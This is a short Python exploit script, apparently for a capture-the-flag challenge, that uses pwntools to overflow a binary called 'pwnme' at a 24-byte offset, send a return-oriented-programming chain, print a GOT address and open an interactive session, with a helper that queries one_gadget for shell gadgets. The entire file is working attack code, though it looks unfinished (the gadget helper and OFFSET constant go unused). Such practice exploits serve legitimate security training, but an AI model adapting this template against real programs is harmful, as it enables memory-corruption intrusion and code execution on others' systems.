#!/usr/bin/env python3

from pwn import *

elf = ELF("pwnme")

context.update(binary=elf, encoding='latin-1')

def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process([elf.path])


OFFSET = 24
def main():
    io = start()
    io.clean()
    rop = ROP(elf)
    rop.pwnme()
    io.fit({ 24: rop.chain()})
    io.sendline("")
    io.clean()
    io.fit({ 24: rop.chain()})
    info(f"pwnme GOT: {hex(elf.got['pwnme'])}")
    io.interactive()


if __name__ == "__main__":
    main()
